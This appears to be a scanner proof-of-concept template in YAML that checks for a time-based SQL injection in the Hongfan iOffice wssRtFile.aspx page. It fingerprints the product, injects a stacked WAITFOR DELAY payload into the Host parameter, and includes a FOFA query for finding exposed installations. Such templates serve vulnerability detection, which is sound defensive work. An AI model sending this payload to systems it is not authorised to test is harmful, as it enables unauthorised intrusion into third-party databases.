id: poc-yaml-hongfan-ioffice-wssrtfile-sqli
info:
  name: 红帆ioffice wssRtFile SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: iOffice
  fofa: app="红帆-ioffice"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"iOffice.net")
- method: GET
  path: /iOffice/prg/set/wss/wssRtFile.aspx?Host=1%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--
  expression: status_code == 200 && (contains(gbk_decode(body),"下载文件") || contains(body,"下载文件"))
    && (contains(gbk_decode(body),"解密错误") || contains(body,"解密错误")) && duration >
    t1 && duration < t2
transport: http
